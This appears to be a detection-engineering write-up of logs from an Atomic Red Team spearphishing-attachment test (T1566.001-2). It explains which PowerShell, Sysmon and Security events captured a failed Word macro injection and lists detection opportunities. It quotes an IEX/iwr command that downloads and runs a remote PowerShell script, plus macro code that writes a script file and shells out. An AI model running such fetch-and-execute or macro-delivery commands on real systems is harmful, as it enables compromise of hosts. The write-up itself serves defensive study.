# T1566.001-2: Spearphishing Attachment — Word spawned a command shell and used an IP address in the command line

## Technique Context

T1566.001 (Spearphishing Attachment) test 2 simulates a macro-enabled Word document that
programmatically executes a shell command. The classic detection rule for this scenario —
`winword.exe` spawning `cmd.exe` or `powershell.exe` — is well-known, so this variant is
notable for two additional characteristics: the macro is injected programmatically via
PowerShell (using `Invoke-MalDoc`) rather than delivered as a real attachment, and the macro
payload contains a bare IP address in the command line (`ping 8.8.8.8`) rather than a hostname.
Adversaries use IP addresses to bypass DNS-based network monitoring and some URL-inspection
controls.

## What This Dataset Contains

The dataset spans approximately 7 seconds (01:56:14–01:56:21 UTC) from ACME-WS02.

**PowerShell 4104 (Script Block Logging)** records the full test framework including:

```
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open \"C:\Users\Public\art.jse\" For Output As #1
   Write #1, \"WScript.Quit\"
   Close #1
   Shell$ \"ping 8.8.8.8\"
"
Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
```

The `Invoke-MalDoc` function itself is loaded from GitHub via `IEX`/`iwr`, and its full
source is captured in a 4104 event — including the `New-Object -ComObject Word.Application`
call used to automate Word.

**PowerShell 4103 (Module Logging)** records:
- `Invoke-WebRequest` fetching `Invoke-MalDoc.ps1` from `raw.githubusercontent.com`
- `New-Object -ComObject "Word.Application"` — with a terminating error
- `Test-Path "HKCU:\Software\Microsoft\Office\\Word\Security\"`
- `New-Item` with a non-terminating error creating the registry path

**PowerShell 4100 (Error)**: `Retrieving the COM class factory for component with CLSID
{00000000-0000-0000-0000-000000000000} failed due to the following error: 80040154 Class not
registered (REGDB_E_CLASSNOTREG)`. Microsoft Word is not installed on this test host, so
the COM object instantiation failed and the macro was never executed.

**Sysmon Event 22 (DNS)** captures a query to `raw.githubusercontent.com` resolving to the
four GitHub CDN IPs. The Image is `<unknown process>` for the same reason as T1566.001-1.

**Security 4688** records `whoami.exe` (ART pre-flight) and `powershell.exe` created under
SYSTEM, with full command lines visible including the entire `& {...}` test block.

## What This Dataset Does Not Contain (and Why)

**No Word process activity.** `winword.exe` never launched because the COM class
`Word.Application` is not registered (Microsoft Office is not installed). The canonical
detection signal for this technique — `winword.exe` spawning `cmd.exe` — is absent. This
test produced attempt telemetry rather than success telemetry.

**No macro execution or `ping 8.8.8.8`.** The shell command embedded in the macro code was
never executed. No `cmd.exe`, `ping.exe`, or `WScript.exe` activity appears.

**No `.jse` file write.** The VBA macro would have written `C:\Users\Public\art.jse`, but
since macro execution never reached that step, no file creation event appears.

**No Sysmon ProcessCreate for `iwr` or the HTTP download.** The `iwr` call that fetches
`Invoke-MalDoc.ps1` occurs inside an existing `powershell.exe` process; no child process is
spawned. The 4103 module log is the only process-level record of the download.

## Assessment

This dataset demonstrates what blocked-but-attempted execution looks like. The PowerShell
logs are rich: the 4104 script block records reveal the full macro payload including the
IP address, and the 4100 error event explicitly captures the COM failure. The absence of
Word activity is itself meaningful — it tells a defender that the technique was attempted but
the prerequisite (Office installation) was not met.

The 97 PowerShell events are dominated by boilerplate. Key signals appear in approximately
6–8 events: the `IEX`/`iwr` invocation, the `Invoke-MalDoc` call with `macrocode` content,
the COM error, and the registry probing. The single Sysmon DNS event and ten Security events
round out the picture.

## Detection Opportunities Present in This Data

- **PowerShell 4104**: `IEX` combined with `iwr` fetching a `.ps1` file, then `Invoke-MalDoc`
  with a `macroCode` parameter, is highly suspicious regardless of whether Office is installed.

- **PowerShell 4100 (Error)**: A REGDB_E_CLASSNOTREG error on `Word.Application` or
  `Excel.Application` COM objects from a script context indicates macro-delivery tooling
  running on a host without Office — a useful signal for lateral movement pivot detection.

- **PowerShell 4103**: `New-Object -ComObject "Word.Application"` in module logs is
  high-fidelity when seen from non-Office processes.

- **Sysmon 22 (DNS)**: `raw.githubusercontent.com` resolution during a PowerShell session
  that also contains `IEX` calls warrants investigation.

- **Security 4688**: Full command line of `powershell.exe` including `Invoke-MalDoc` is
  visible due to command-line auditing; this string is uncommon in production environments.
